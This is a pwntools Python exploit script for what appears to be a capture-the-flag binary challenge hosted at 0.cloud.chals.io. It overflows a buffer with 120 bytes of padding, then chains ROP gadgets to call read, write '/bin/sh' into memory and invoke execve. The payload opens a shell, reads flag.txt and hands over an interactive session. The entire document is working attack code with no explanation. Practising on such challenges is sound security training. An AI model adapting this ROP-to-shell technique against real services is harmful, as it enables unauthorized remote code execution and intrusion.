from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

if args.REMOTE:
   HOST = '0.cloud.chals.io' 
   PORT=20785
else:
   pass

gs = '''
continue
'''


bin_sh = next(e.search(b'sh\0'))
pop_rax = r.find_gadget(['pop rax', 'ret'])[0]
pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
log.info(f"RDI = {hex(pop_rdi)}")
pop_rsi = r.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = r.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]
syscall = r.find_gadget(['syscall','ret'])[0]
writeable_addr = 0x4b1590 #0x4adbd0

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST,PORT)
    else:
        return process(e.path)


p = start()

chain = cyclic(120)

chain += p64(pop_rdi)
chain += p64(0)
chain += p64(pop_rsi)
chain += p64(writeable_addr)
chain += p64(pop_rdx)
chain += p64(8)
chain += p64(0)
chain += p64(pop_rax)
chain += p64(0)
chain += p64(syscall)
chain += p64(pop_rdi)
chain += p64(writeable_addr)
chain += p64(pop_rsi)
chain += p64(0x0)
chain += p64(pop_rdx)
chain += p64(0x0)
chain += p64(0x0)
chain += p64(pop_rax)
chain += p64(0x3b)
chain += p64(syscall)


log.info(f"Sending First Stage")
p.sendline(chain)
log.info("Pausing Before Second Stage")
pause(1)
log.info("Sending Write Primitive")
p.sendline(b'/bin/sh\0')
pause(1)
log.info("Cattign Flag")
p.sendline(b'cat flag.txt')
p.interactive()
